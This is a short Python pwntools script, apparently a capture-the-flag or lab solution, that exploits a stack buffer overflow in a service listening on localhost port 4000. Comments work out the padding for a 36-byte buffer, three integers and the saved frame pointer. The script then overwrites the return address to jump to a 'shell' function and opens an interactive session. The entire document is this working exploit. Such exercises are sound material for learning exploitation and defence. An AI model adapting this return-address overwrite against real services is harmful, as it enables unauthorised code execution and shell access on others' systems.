from pwn import *

r = remote("localhost", 4000)
message = r.recv(1024)
print(message.decode())
# we need to fill :
# * the str var (char[36])
# * 3 int/uint vars declared after (3 * 4 bytes)
# * 8 bytes for the saved frame pointer (rbp)
# then we can override the function's return address to point to the shell function
r.sendline(b"a"*(36+3*4+8) + p64(0x00000000004011a2))
r.interactive()

